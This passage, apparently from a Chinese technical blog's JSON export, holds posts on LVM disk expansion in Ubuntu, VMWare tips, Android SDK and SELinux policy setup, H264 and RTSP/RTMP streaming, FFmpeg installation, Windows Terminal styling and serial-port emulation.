209715200 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x6f04a426 Device Boot Start End Blocks Id System/dev/sdb1 2048 209715199 104856576 83 LinuxDisk /dev/mapper/bogon--vg-root: 20.1 GB, 20124270592 bytes255 heads, 63 sectors/track, 2446 cylinders, total 39305216 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000Disk /dev/mapper/bogon--vg-root doesn’t contain a valid partition tableDisk /dev/mapper/bogon--vg-swap_1: 1069 MB, 1069547520 bytes255 heads, 63 sectors/track, 130 cylinders, total 2088960 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000Disk /dev/mapper/bogon--vg-swap_1 doesn’t contain a valid partition table 4. 创建新的物理卷123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051root@bogon:~# pvcreate /dev/sdb1 Physical volume \"/dev/sdb1\" successfully created# 显示目前存在的物理卷信息root@bogon:~# pvdisplay --- Physical volume --- PV Name /dev/sda5 VG Name bogon-vg PV Size 19.76 GiB / not usable 2.00 MiB Allocatable yes PE Size 4.00 MiB Total PE 5058 Free PE 5 Allocated PE 5053 PV UUID HSucTv-jtIU-itcZ-VmXp-ygRg-Xe02-uC0I8u \"/dev/sdb1\" is a new physical volume of \"100.00 GiB\" --- NEW Physical volume --- PV Name /dev/sdb1 VG Name PV Size 100.00 GiB Allocatable NO PE Size 0 Total PE 0 Free PE 0 Allocated PE 0 PV UUID BEN0cc-twRr-d419-GdCC-BJ5a-3I3x-OwxNHH #显示存在的卷组root@bogon:~# vgdisplay --- Volume group --- VG Name bogon-vg System ID Format lvm2 Metadata Areas 1 Metadata Sequence No 3 VG Access read/write VG Status resizable MAX LV 0 Cur LV 2 Open LV 2 Max PV 0 Cur PV 1 Act PV 1 VG Size 19.76 GiB PE Size 4.00 MiB Total PE 5058 Alloc PE / Size 5053 / 19.74 GiB Free PE / Size 5 / 20.00 MiB VG UUID eW4kvx-NYtj-Udfe-NZCZ-ITzN-Ibbz-31na6C 得到以下关键信息： 卷组 VG Name: bogon-vg 卷组大小 VG Size: 19.76 GiB 可分配的空间 Free PE / Size: 5 / 20.00 MiB 可分配的空间仅20MiB，所以我们要添加一个新的物理卷到卷组 bogon-vg 5. 扩展卷组123456789101112131415161718192021222324# 把物理卷/dev/sdb1 扩展添加到卷组 bogon-vg 中root@bogon:~# vgextend bogon-vg /dev/sdb1 Volume group \"bogon-vg\" successfully extendedroot@bogon:~# vgdisplay --- Volume group --- VG Name bogon-vg System ID Format lvm2 Metadata Areas 2 Metadata Sequence No 4 VG Access read/write VG Status resizable MAX LV 0 Cur LV 2 Open LV 2 Max PV 0 Cur PV 2 Act PV 2 VG Size 119.75 GiB PE Size 4.00 MiB Total PE 30657 Alloc PE / Size 5053 / 19.74 GiB Free PE / Size 25604 / 100.02 GiB #增加100G可用空间 VG UUID eW4kvx-NYtj-Udfe-NZCZ-ITzN-Ibbz-31na6C 6. 扩展逻辑卷1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# 查看逻辑卷root@bogon:~# lvdisplay --- Logical volume --- LV Path /dev/bogon-vg/root LV Name root VG Name bogon-vg LV UUID dPvAEs-EUUu-nxlD-EU21-pHP1-qL5q-LTncQ6 LV Write Access read/write LV Creation host, time bogon, 2017-04-18 15:13:48 +0800 LV Status available # open 1 LV Size 18.74 GiB Current LE 4798 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 252:0 --- Logical volume --- LV Path /dev/bogon-vg/swap_1 LV Name swap_1 VG Name bogon-vg LV UUID 0BSenv-UESB-hH9X-zRUv-xZsD-pjdk-kNMx4N LV Write Access read/write LV Creation host, time bogon, 2017-04-18 15:13:48 +0800 LV Status available # open 2 LV Size 1020.00 MiB Current LE 255 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 256 Block device 252:1# 扩展逻辑卷为120G(注意：这里是最终大小，而不是增加的大小)root@bogon:~# lvextend -L 120G /dev/bogon-vg/root Extending logical volume root to 120.00 GiB #空间不太够: 25922 - 25604 = 318 Insufficient free space: 25922 extents needed, but only 25604 available root@bogon:~# # 试一下扩展逻辑卷为119Groot@bogon:~# lvextend -L 119G /dev/bogon-vg/root Extending logical volume root to 119.00 GiB #空间不太够: 25666 - 25604 = 62，应该指定118G就可以了 Insufficient free space: 25666 extents needed, but only 25604 available # 还有一个方法，直接分配所有可用空间 root@bogon:~# lvextend -l +100%FREE /dev/bogon-vg/root Extending logical volume root to 118.76 GiB Logical volume root successfully resized # 逻辑卷大小已经扩展成功 7. 重新计算逻辑卷1234567891011121314151617181920212223242526272829303132root@bogon:~# df -hFilesystem Size Used Avail Use% Mounted onudev 2.9G 4.0K 2.9G 1% /devtmpfs 596M 3.2M 592M 1% /run/dev/dm-0 19G 16G 1.9G 90% /none 4.0K 0 4.0K 0% /sys/fs/cgroupnone 5.0M 0 5.0M 0% /run/locknone 3.0G 4.0K 3.0G 1% /run/shmnone 100M 0 100M 0% /run/user/dev/sda1 236M 41M 183M 19% /boot# 文件系统还没有识别逻辑卷root@bogon:~#root@bogon:~#root@bogon:~# # 重新计算逻辑卷root@bogon:~# resize2fs /dev/bogon-vg/rootresize2fs 1.42.9 (4-Feb-2014)Filesystem at /dev/bogon-vg/root is mounted on /; on-line resizing requiredold_desc_blocks = 2, new_desc_blocks = 8The filesystem on /dev/bogon-vg/root is now 31131648 blocks long.# 已经可以识别逻辑卷root@bogon:~# df -lhFilesystem Size Used Avail Use% Mounted onudev 2.9G 4.0K 2.9G 1% /devtmpfs 596M 3.2M 592M 1% /run/dev/dm-0 117G 16G 97G 14% /none 4.0K 0 4.0K 0% /sys/fs/cgroupnone 5.0M 0 5.0M 0% /run/locknone 3.0G 4.0K 3.0G 1% /run/shmnone 100M 0 100M 0% /run/user/dev/sda1 236M 41M 183M 19% /bootroot@bogon:~# 扩容成功！ 参考【cnblogs.com】","categories":[{"name":"虚拟化技术&云平台","slug":"虚拟化技术-云平台","permalink":"http://yoursite.com/categories/虚拟化技术-云平台/"}],"tags":[{"name":"LVM","slug":"LVM","permalink":"http://yoursite.com/tags/LVM/"}]},{"title":"VMWare安装CHOST","slug":"虚拟化技术&云平台/VMWare安装CHOST","date":"2020-07-03T11:52:36.000Z","updated":"2021-12-28T03:24:10.297Z","comments":true,"path":"虚拟化技术&云平台/VMWare安装CHOST/","link":"","permalink":"http://yoursite.com/虚拟化技术&云平台/VMWare安装CHOST/","excerpt":"","text":"升级到VM15后，在网上下载Windows7 、 XP的Chost镜像，一直提示“CDBOOT: Couldn’t find BOOTMER”，修改VMWare虚拟机的BIOS第一启动项为CD依然不行。 安装Linux系统（Ubuntu 20.04）却很顺利的。 查看下载的镜像文件，原来是没有boot.ini文件","categories":[{"name":"虚拟化技术&云平台","slug":"虚拟化技术-云平台","permalink":"http://yoursite.com/categories/虚拟化技术-云平台/"}],"tags":[{"name":"VMWare","slug":"VMWare","permalink":"http://yoursite.com/tags/VMWare/"}]},{"title":"VMWare虚拟机进BIOS","slug":"虚拟化技术&云平台/VMWare虚拟机进BIOS","date":"2020-07-03T11:52:36.000Z","updated":"2021-12-28T03:24:10.298Z","comments":true,"path":"虚拟化技术&云平台/VMWare虚拟机进BIOS/","link":"","permalink":"http://yoursite.com/虚拟化技术&云平台/VMWare虚拟机进BIOS/","excerpt":"","text":"很简单，将虚拟机关机，在菜单栏“启动”绿色按钮旁边的更多三角形按钮，可以看到最底下有一个选项“打开电源时进入固件”，点击就可以进入BIOS啦。","categories":[{"name":"虚拟化技术&云平台","slug":"虚拟化技术-云平台","permalink":"http://yoursite.com/categories/虚拟化技术-云平台/"}],"tags":[{"name":"VMWare","slug":"VMWare","permalink":"http://yoursite.com/tags/VMWare/"}]},{"title":"VMWare为Ubuntu添加硬盘","slug":"虚拟化技术&云平台/VMWare为Ubuntu添加硬盘","date":"2020-07-03T11:52:36.000Z","updated":"2021-12-28T03:24:10.296Z","comments":true,"path":"虚拟化技术&云平台/VMWare为Ubuntu添加硬盘/","link":"","permalink":"http://yoursite.com/虚拟化技术&云平台/VMWare为Ubuntu添加硬盘/","excerpt":"","text":"VMWare中的Ubuntu虚拟机当初创建时只分配了20G硬盘，结果现在硬盘爆满了，记得VMWare可以加硬盘的，所以给它加了一块虚拟硬盘，记录一下过程。 添加虚拟硬盘 VM关机，在“编辑虚拟机设置” 中“硬件”给虚拟机实例添加一块硬盘。 开机进入Ubuntu（这里是root身份登录，所以命令没有加sudo） 查看所有的硬盘，其中 /dev/sdb 是我们的第二块硬盘。 1$ fdisk -l 添加新分区 1$ fdisk /dev/sdb 从上到下代表意思： a. p: 查看当前的分区信息 b. n: 添加新分区 c. p: 选择添加为主分区 d. 三个回车默认：分区编号、分区的开始值、分区的结束值 e. w：保存退出 查看系统设备 1$ ls /dev/ /dev/sdb1 就是新分区设备（编号默认1） 格式化新分区设备 1mkfs -t ext3 /dev/sdb1 开机挂载新分区为/data 1234$ vim /etc/fstab# 新增一行/dev/sdb1 /data ext3 defaults 0 0 备注：ext3 、ext4 文件格式都可以。 重启看下是否挂载了新分区为/data","categories":[{"name":"虚拟化技术&云平台","slug":"虚拟化技术-云平台","permalink":"http://yoursite.com/categories/虚拟化技术-云平台/"}],"tags":[{"name":"VMWare,添加硬盘","slug":"VMWare-添加硬盘","permalink":"http://yoursite.com/tags/VMWare-添加硬盘/"}]},{"title":"VMWare CD/DVD 驱动器的类型","slug":"虚拟化技术&云平台/VMWare CD-DVD 驱动器的类型","date":"2020-07-03T11:52:36.000Z","updated":"2021-12-28T03:24:10.295Z","comments":true,"path":"虚拟化技术&云平台/VMWare CD-DVD 驱动器的类型/","link":"","permalink":"http://yoursite.com/虚拟化技术&云平台/VMWare CD-DVD 驱动器的类型/","excerpt":"","text":"CD/DVD 驱动器的类型： 如果选择操作系统为XP的话，CD/DVD 驱动器默认是IDE类型。 如果选择操作系统为Win7的话，CD/DVD 驱动器默认是SATA类型。 CD/DVD 驱动器底下有一个“高级”按钮，可以修改驱动器的类型。","categories":[{"name":"虚拟化技术&云平台","slug":"虚拟化技术-云平台","permalink":"http://yoursite.com/categories/虚拟化技术-云平台/"}],"tags":[{"name":"VMWare","slug":"VMWare","permalink":"http://yoursite.com/tags/VMWare/"}]},{"title":"GitHub加速","slug":"github/github加速","date":"2020-07-02T11:56:36.000Z","updated":"2021-12-28T03:24:10.243Z","comments":true,"path":"github/github加速/","link":"","permalink":"http://yoursite.com/github/github加速/","excerpt":"","text":"国内 git clone github上的仓库一直不快，但现在很慢，经常超时，发现一个镜像加速站点: github.com.cnpmjs.org。 如： 12345$ git clone https://github.com/bilibili/ijkplayer.git# 改为$ git clone https://github.com.cnpmjs.org/bilibili/ijkplayer.git 速度体验符合预期！！！ 而且 github.com.cnpmjs.org 也可以网页浏览，但不可以登录。","categories":[{"name":"Github","slug":"Github","permalink":"http://yoursite.com/categories/Github/"}],"tags":[{"name":"github","slug":"github","permalink":"http://yoursite.com/tags/github/"}]},{"title":"Android Linux命令行环境变量配置","slug":"Android/Android Linux命令行环境变量配置","date":"2020-07-02T11:52:36.000Z","updated":"2021-12-28T03:24:10.090Z","comments":true,"path":"Android/Android Linux命令行环境变量配置/","link":"","permalink":"http://yoursite.com/Android/Android Linux命令行环境变量配置/","excerpt":"","text":"Ubuntu下安装配置Android命令行编译环境，用于Jenkins编译项目和NDK编译第三方so库。 安装命令行工具sdkmanager 【在下载页面】 下载【commandlinetools-linux】 至路径 /usr/local/androidsdk 解压到当前目录，命令行工具的目录是 cmdline-tools sdkmanager是可执行文件 123456789101112$ cd cmdline-tools/$ lsbin lib NOTICE.txt source.properties$ tree binbin├── apkanalyzer├── avdmanager├── lint├── screenshot2└── sdkmanager0 directories, 5 files 配置环境变量设置全局环境变量 vim /etc/profile ，（如果只设置当前帐号，编辑 vim ~/.bashrc ）。 123456789101112131415#javaJAVA_HOME=/usr/local/jdk1.8JRE_HOME=$JAVA_HOME/jreJAVA_BIN=$JAVA_HOME/binCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME PATH CLASSPATH#android sdkexport ANDROID_HOME=/usr/local/androidsdkexport PATH=$PATH:$ANDROID_HOME/tools/bin:$ANDROID_HOME/platform-tools:$ANDROID_HOME/cmdline-tools/bin#android ndkexport ANDROID_NDK=$ANDROID_HOME/ndk/21.3.6528147export PATH=$&#123;ANDROID_NDK&#125;:$PATH 使环境变量立刻生效1$ source ~/.bashrc 安装sdk 12345678910111213141516$ sdkmanager --list --sdk_root=/usr/local/androidsdkError: Could not determine SDK root. Error: Either specify it explicitly with --sdk_root= or move this package into its expected location: \\cmdline-tools\\latest\\# 这个错误是由于我们还没有安装sdk，执行sdkmanager时要指定一下我们的sdk路径，相当于指定它下载文件的路径$$# 查看现在的build-tools版本有哪些$ sdkmanager --list --sdk_root=/usr/local/androidsdk |grep build-tools # 选择一个合适的版本，安装$ sdkmanager --install \"build-tools;30.0.3\" --sdk_root=/usr/local/androidsdk# 安装平台工具$ sdkmanager --install \"platform-tools\" --sdk_root=/usr/local/androidsdk# 这时候就不用指定sdk的路径了$ sdkmanager --list# 安装Android-30$ sdkmanager --install \"platforms;android-30\" 附：sdkmanager 安装NDK1234567$ sdkmanager --list |grep cmake # 选择一个版本，或者最新版本$ sdkmanager --install \"cmake;3.10.2.4988404\"$ sdkmanager --list |grep ndk # 选择一个版本，或者最新版本$ sdkmanager --install \"ndk;21.3.6528147\" 【sdkmanager用户指南 】","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"jks","slug":"jks","permalink":"http://yoursite.com/tags/jks/"}]},{"title":"开源的H264数据包分析软件H264BSAnalyzer","slug":"音视频/开源的H264数据包分析软件H264BSAnalyzer","date":"2020-07-01T11:52:36.000Z","updated":"2021-12-28T03:24:10.318Z","comments":true,"path":"音视频/开源的H264数据包分析软件H264BSAnalyzer/","link":"","permalink":"http://yoursite.com/音视频/开源的H264数据包分析软件H264BSAnalyzer/","excerpt":"","text":"https://github.com/latelee/H264BSAnalyzer 是一个Win程序，用于分享H264文件，已有打包好exe的文件。 打开一个H264文件，如图 可以看到这个软件已经把每一个Nal解析为一行一行的，H264文件就是以Nal为单位。 一个H264文件，开头的是SPS和PPS，SEI可有可无，然后就是I帧，再就P帧或者B帧。 每一帧都会有一个start code，H264BSAnalyzer 是将 00 00 00 01 + FNRIType（第一个字节） 作为 start code 。 00 00 00 01 也可以看做是一个分隔符，00 00 01 也是合法的 FNRIType的二进制表示意义：12345// +---------------+// |0|1|2|3|4|5|6|7|// +-+-+-+-+-+-+-+-+// |F|NRI| Type |// +---------------+ F 占1bit，是禁止位，它的值一定是0，非0就说明这个Nal是错误的NRI 占2bit，它的取值范围在0~3，值越大，表示这个Nal越重要Type 占5bit，表示Nal的类型nal_type。 常见的FNRIType字节值有：12345667：SPS68：PPS65：I帧41：非I帧61：非I帧... 通过这个字节可以简单的判断帧类型，但严谨的作法是： 读取这个字节的低位5个bit，转为十进制，这才是真正的类型值 nal_type。以 0x67 作为例： 0x67的二进制是 0x01100111 取5个bit高位补零 就是 0x00000111 （ &amp;0x1F ） 十进制是7。 查表找到SPS 值 NAL类型 0 未使用 1 非IDR的片 2 片数据A分区 3 片数据B分区 4 片数据C分区 5 一个序列的第一个图像叫做 IDR 图像（立即刷新图像），IDR 图像都是 I 帧 6 补充增强信息单元（SEI） 7 序列参数集(SPS) 8 图像参数集(PPS) 9 分界符 10 序列结束 11 码流结束 12 填充 13…23 保留 24…31 未使用","categories":[{"name":"音视频","slug":"音视频","permalink":"http://yoursite.com/categories/音视频/"}],"tags":[]},{"title":"音视频推流协议RTSP和RTMP","slug":"音视频/音视频推流协议RTSP和RTMP","date":"2020-07-01T11:52:36.000Z","updated":"2021-12-28T03:24:10.321Z","comments":true,"path":"音视频/音视频推流协议RTSP和RTMP/","link":"","permalink":"http://yoursite.com/音视频/音视频推流协议RTSP和RTMP/","excerpt":"","text":"这是两种常用的音视频推流协议，这里简单比较一下两种协议应用场景（本文适合Java、Android开发者）。 参考： 【视频传输协议详解（RTMP、RTSP、HLS）】 【流媒体 RTSP/RTP/RTCP/RTMP H264】 【从零开始写一个RTSP服务器】 一、RTMPReal Time Messaging Protocol（实时消息传输协议）是 Adobe 的私有协议，设计用来进行实时数据通信的网络协议，主要用来在Flash/AIR平台和支持RTMP协议的流媒体/交互服务器之间进行音视频和数据通信。 基本架构：采集端rtmp-client-&gt; web服务器rtmp-server -&gt; 播放端rtmp-client特点： RTMP特性 延迟较大 传输效率相对较低 底层采用TCP,网络环境较差下，采用RTMP保证了视频的传输质量 浏览器支持 一般需要一个流服务器中转 应用场景 网络直播（如斗鱼等平台） 二、RTSPReal Time Streaming Protocol（实时流媒体协议）在网络环境比较稳定的情况下，传输效率是比较高，虽然实时性比较好，用在互联网上可能会丢包。网络摄像头常采用RTSP协议，比如海康的摄像头。RTSP只是一个实时流媒体协议（应用层文本协议，类HTTP），RTSP只负责会话,如建立连接、播放暂停控制等。而RTP协议（实时传输协议）负载传输音视频数据，RTP又分为 rtp over tcp 和 rtp over udp，【RFC3984中文版】、【RTP/RTCP协议与RTSP协议】。 一般的cs架构如下： 直播： 采集端rtps-client-&gt; web服务器rtsp-server -&gt; 播放端rtsp-client 点播： web服务器rtsp-server -&gt; 播放端rtsp-client 监控： 采集端rtsp-server -&gt; 播放端rtsp-client RTSP特性 通常说的RTSP包括RTSP协议、RTP协议、RTCP协议 RTSP协议：负责服务器与客户端之间的请求与响应 RTP协议：负责传输媒体数据 RTCP协议：在RTP传输过程中提供传输信息来自RTSP协议讲解 特点： 实时性比较好 传输效率是比较高 底层采用RTP传输，RTP大多数采用UDP（也可以TCP），网络复杂环境下容易丢包 浏览器不支持 应用场景 网络摄像头、安防监控（如海康摄像头） IPTV 三、开源软件Ⅰ、推流端 【rtmp-rtsp-stream-client-java】 纯Java编写的RTSP和RTMP推流Client（推荐学习其源码），直接封装Android的Camera层，非常容易使用，支持Camera1和Camera2 API。 【yasea】 Android RTMP 推流 Client，它将摄像头YUV和麦克风PCM数据编码到H.264/AAC中，封装在FLV中。 依赖C库：libx264、libyuv、libenc 【JavaCV推流】 JavaCV这个项目底层调用的ffmpeg，所以RTMP和RTSP都支持。 OBS PC桌面RTMP推流开源软件，现在网红主播用的主流软件(跨平台)。 Ⅱ、服务端 【nginx-rtmp-module】 国人写的项目，仅支持rtmp，目前(20200708) start 9.7K ，它nginx的一个插件，需要自己编译一次nginx。 【srs】 国人写的这是C++项目，目前(20200708) start 8.9K ，项目介绍 ，支持RTMP/HLS/WebRTC/SRT/GB28181。新版本貌似RTSP也支持了？ EasyDarwin 国内公司写的Go项目，目前(20200708) start 4.1K ，高性能开源RTSP流媒体服务器，RTSP推模式转发、RTSP拉模式转发、录像、检索、回放、关键帧缓存、秒开画面、RESTful接口、WEB后台管理、分布式负载均衡。 【AndroidShow】 国人写的Android App项目，通过MediaProjectionManager采集Android屏幕视频流，手机采集端做rtsp server，通过rtp over udp 传输视频流，但还没有实现音频，具体看作者的博客：【Android录屏直播】 注：传输用的【spydroid-ipcamera】代码 【spydroid-ipcamera】 这是法国人写的Android App项目，很久远的项目了，第一次提交是2013年，它可以将您手机变成网络摄像头(提供RTSP Server)，项目不再维护，但是作者将这个项目独立为一个Java库:【libstreaming】。 注: 【spydroid-ipcamera源码分析】 【libstreaming】 从【spydroid-ipcamera】独立出来的 Android Java库，目前(20200708) start 2.9K 。 注： 【示例代码：libstreaming-examples】 live555 c++编写的项目，RTSP点播服务器，不支持推/拉流转发。【Live555 搭建流媒体服务器】 【RTSP-Client-Server】 国外的Java Swing项目，目前(20200708) start 376 ，源码很少和简单（项目没有用IDE创建，用命令行编译），可读性强，运行效果是client点播server的Mjpeg文件，不依赖第三方。 【rtsp-netty-server 】 国人写的Java项目（Elicpse），目前(20200708) start 1 。 RTP数据部分依赖【libjitsi】的RawPacket类。 注：【libjitsi】 实时音频/视频通信的高级Java媒体库，没有在mvnrepository发布，编译很麻烦，jitsi是做视频会议全套软件的。 【monibuca】国内公司写的Go项目，目前(20200721) start 209 ，Monibuca 引擎 + 插件 = 定制化流媒体服务器。官网，这是一个新的项目，看commit记录，是2020年提交的项目。 Ⅲ、播放端和拉流 VLC ffplay ijkplayer JavaCV库拉流(底层调用的ffmpeg) 【code.google.com/p/rtsplib-java】这是一个纯Java实现的 RTSPClient 远古时代的库(Eclipse)，只实现了RTSP部分的协议（PLAY等方法），可以基于它实现扩展其他方法。 【srysduedu123/rtsp-h264-client】 基于 rtsplib-java ，加了解析RTP和H264 。 【htwahzs/Rtsp-Android-Client】 不依赖其他库，纯java实现RTSP、RTP、RTCP和硬解码渲染，经测试能正常播放，出图速度比ijkpaler快 。但本身这个仓库只有纯Java类(完整)，不是一个完整的Android项目，我fork了此项目，做成一个Demo【kevinvane/Rtsp-Android-Client】。 四、利用开源软件搭建一套直播测试平台 rtsp-client推流： ffmpeg 推流 或者 rtmp-rtsp-stream-client-java (Android,集成到自己项目中推荐使用) rtsp-server：ffmpeg的ffserver 或者 EasyDarwin （EasyDarwin rtsp端口554，web管理后台端口10008） rtsp-play： ffmpeg的ffplay 、VCL或者 ijkplayer(移动端，集成到自己项目中推荐使用) 注：EasyDarwin有提供各个平台的软件，除了服务端好用，其他觉得有点难用，不推荐。 五、流视频录制并存储方案 JavaCV从流服务器拉取音视频录制底层是调用的是ffmpeg拉流存储 EasyDarwin的方案EasyDarwin自带录制功能，对外提供 RESTFUL API 详细文章 -&gt; 【EasyDarwinGo录像功能发布】底层也是调用的是ffmpeg拉流存储的方案，这是它默认配置文件： 123456789101112131415161718192021222324252627[rtsp]port=554; rtsp 超时时间，包括RTSP建立连接与数据收发。timeout=28800; 是否使能gop cache。如果使能，服务器会缓存最后一个I帧以及其后的非I帧，以提高播放速度。但是可能在高并发的情况下带来内存压力。gop_cache_enable=1; 是否使能向服务器推流或者从服务器播放时验证用户名密码. [注意] 因为服务器端并不保存明文密码，所以推送或者播放时，客户端应该输入密码的md5后的值。; password should be the hex of md5(original password)authorization_enable=0; 是否使能推送的同事进行本地存储，使能后则可以进行录像查询与回放。save_stream_to_local=0;easydarwin使用ffmpeg工具来进行存储。这里表示ffmpeg的可执行程序的路径ffmpeg_path=/Users/ze/Downloads/ffmpeg-20180719-9cb3d8f-macos64-shared/bin/ffmpeg;本地存储所将要保存的根目录。如果不存在，程序会尝试创建该目录。m3u8_dir_path=/Users/ze/Downloads/EasyDarwinGoM3u8;切片文件时长。本地存储时，将以该时间段为标准来生成ts文件(该时间+一个I帧间隔)，单位秒。;如果需要直播，这个值设小点，但是这样会产生很多ts文件；如果不需要直播，只要存储的话，可设大些。ts_duration_second=6;key为拉流时的自定义路径，value为ffmpeg转码格式，比如可设置为-c:v copy -c:a copy，表示copy源格式；default表示使用ffmpeg内置的输出格式，会进行转码。","categories":[{"name":"音视频","slug":"音视频","permalink":"http://yoursite.com/categories/音视频/"}],"tags":[]},{"title":"Ubuntu 安装FFmpeg","slug":"Linux/Ubuntu 安装FFmpeg","date":"2020-06-28T14:58:36.000Z","updated":"2021-12-28T03:24:10.175Z","comments":true,"path":"Linux/Ubuntu 安装FFmpeg/","link":"","permalink":"http://yoursite.com/Linux/Ubuntu 安装FFmpeg/","excerpt":"","text":"1. 二进制文件下载（推荐）Ubuntu直接下载deb包 ，用 dpkg -i 安装。 注：Ubuntu或者其他版本的linux，也可以下载Linux Static Builds 可执行文件 , 放在 /usr/bin 目录下，修改权限为可执行(777)即可。 2. 命令安装123sudo add-apt-repository ppa:mc3man/trusty-mediasudo apt-get updatesudo apt-get install ffmpeg 缺点：国内下载速度会比较慢 3. 源码编译安装源码下载，自己编译，需要C/C++编译环境，比较麻烦，省。","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"FFmpeg","slug":"FFmpeg","permalink":"http://yoursite.com/tags/FFmpeg/"}]},{"title":"Android SELinux权限匹配","slug":"Android/Android SELinux权限匹配","date":"2020-05-29T11:52:36.000Z","updated":"2021-12-28T03:24:10.101Z","comments":true,"path":"Android/Android SELinux权限匹配/","link":"","permalink":"http://yoursite.com/Android/Android SELinux权限匹配/","excerpt":"","text":"在做Android 系统OTA升级App时，需要在 ‘/cache‘ 目录创建目录和脚本文件，App已经获取到system权限（安装到 /system/priv-app 目录），但是还是在/cache 目录下没有权限。 通过 adb 命令，用system身份执行命令都没有任何问题。 升级命令脚本是：123&quot;mkdir /cache/recovery&quot;&quot;echo \\&quot;--update_package=/data/update.zip\\&quot; &gt; /cache/recovery/command&quot;reboot recovery 但建议调用Android的接口 RecoverySystem.installPackage(this,new File(&quot;/data/update.zip&quot;)); 执行（也是差不多这些命令） 通过 adb logcat 抓到关键日志： 1[ 436.020771] type=1400 audit(1590734406.224:28): avc: denied &#123; write &#125; for pid=7767 comm=&quot;com.github.test&quot; name=&quot;recovery&quot; dev=&quot;mmcblk0p23&quot; ino=8197 scontext=u:r:system_app:s0 tcontext=u:object_r:cache_file:s0 tclass=dir permissive=0 这就是SELinux拦截的日志。 进入 adb shell 看一下SELinux对cache目录拦截的属性 123root@la0920:/ # ls -Z | grep cachedrwxrwx--- system cache u:object_r:cache_file:s0 cacheroot@la0920:/ # 要确定是不是SELinux导致这个问题，简单测试一下，临时关闭SELinux 1adb shell setenforce 0 如果确定问题了，那就要根据报错日志，匹配一条记录 [ 436.020771] type=1400 audit(1590734406.224:28): avc: denied { write } for pid=7767 comm=”com.github.test” name=”recovery” dev=”mmcblk0p23” ino=8197 scontext=u:r:system_app:s0 tcontext=u:object_r:cache_file:s0 tclass=dir permissive=0 缺少什么权限： { execute}权限， 谁缺少权限： scontext = u:r:platform_app:s0 对哪个文件缺少权限：tcontext = u:object_r:app_data_file 什么类型的文件： tclass= file avc: denied { write } for pid=7767 comm=”com.github.test” name=”recovery” dev=”mmcblk0p23” ino=8197 scontext=u:r:system_app:s0 tcontext=u:object_r:cache_file:s0 tclass=dir 根据1allow scontext tcontext:tclass denied; 得出一条记录1allow system_app cache_file:dir write; 在Android Framwork 源码路径： external/sepolicy/*.te 找了相关的scontext文件，如 system_app.te，在 external/sepolicy/system_app.te 这个文件加入这条记录。 重新编译。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"SELinux,Android","slug":"SELinux-Android","permalink":"http://yoursite.com/tags/SELinux-Android/"}]},{"title":"Windows Terminal美化","slug":"随笔/Windows Terminal美化","date":"2020-05-23T03:32:36.000Z","updated":"2021-12-28T03:24:10.307Z","comments":true,"path":"随笔/Windows Terminal美化/","link":"","permalink":"http://yoursite.com/随笔/Windows Terminal美化/","excerpt":"","text":"1. 在应用商店安装Windows Terminal安装完成之后，启动Windows Terminal,在Windows Terminal内完成一些软件安装。 2. 允许powershell执行脚本1$ Set-ExecutionPolicy RemoteSigned -Scope CurrentUser 3. 安装posh-git和oh-my-poshoh-my-posh 可以让powershell的样式和 linux下的oh-my-zsh一样。12$ Install-Module posh-git -Scope CurrentUser$ Install-Module oh-my-posh -Scope CurrentUser 4. 启用默认设置12$ Set-Prompt$ Import-Module oh-my-posh 5. 执行命令使用notepad打开PROFILE1$ if (!(Test-Path -Path $PROFILE )) &#123; New-Item -Type File -Path $PROFILE -Force &#125; notepad $PROFILE 输入：123Import-Module posh-gitImport-Module oh-my-poshSet-Theme Paradox 6. 安装字体Delugia.Nerd.Font.Complete.ttf 7. 配色打开setting,这是一个json配置文件 “profiles” - “colorScheme” 字段是配置颜色主题name，主题在”schemes”: []中定义,如： 123456789101112131415161718192021&#123; \"name\": \"synthwave-everything\", \"black\": \"#fefefe\", \"red\": \"#f97e72\", \"green\": \"#72f1b8\", \"yellow\": \"#fede5d\", \"blue\": \"#6d77b3\", \"purple\": \"#c792ea\", \"cyan\": \"#f772e0\", \"white\": \"#fefefe\", \"brightBlack\": \"#fefefe\", \"brightRed\": \"#f88414\", \"brightGreen\": \"#72f1b8\", \"brightYellow\": \"#fff951\", \"brightBlue\": \"#36f9f6\", \"brightPurple\": \"#e1acff\", \"brightCyan\": \"#f92aad\", \"brightWhite\": \"#fefefe\", \"background\": \"#2a2139\", \"foreground\": \"#f0eff1\"&#125; 更多主题：iTerm2-Color-Schemes","categories":[{"name":"随笔","slug":"随笔","permalink":"http://yoursite.com/categories/随笔/"}],"tags":[]},{"title":"Android配置模拟串口调试","slug":"Android/Android配置模拟串口调试","date":"2020-05-14T11:52:36.000Z","updated":"2021-12-28T03:24:10.115Z","comments":true,"path":"Android/Android配置模拟串口调试/","link":"","permalink":"http://yoursite.com/Android/Android配置模拟串口调试/","excerpt":"","text":"开发Android IOT平台应用要用到串口，但硬件往往慢一拍，我们为了快速调试，可以使用模拟串口来解决问题。 本文最终实现：PC端口串口和Genymotion模拟器串口进行通信。 安装模拟工具在Windows平台下安装 串口模拟工具-VSP 新建一对串口模拟COM1和COM2。 配置Genymotion模拟器 确定目标模拟器 通过VirtualBox来设置串口 在PC端用串口工具打开COM2 在Android App中打开串口 COM1COM1 在Linux的串口命名为 /dev/ttyS0 通信Android App运行在 Genymotion 模拟器上打开了 COM1 ，PC上串口工具打开了COM2 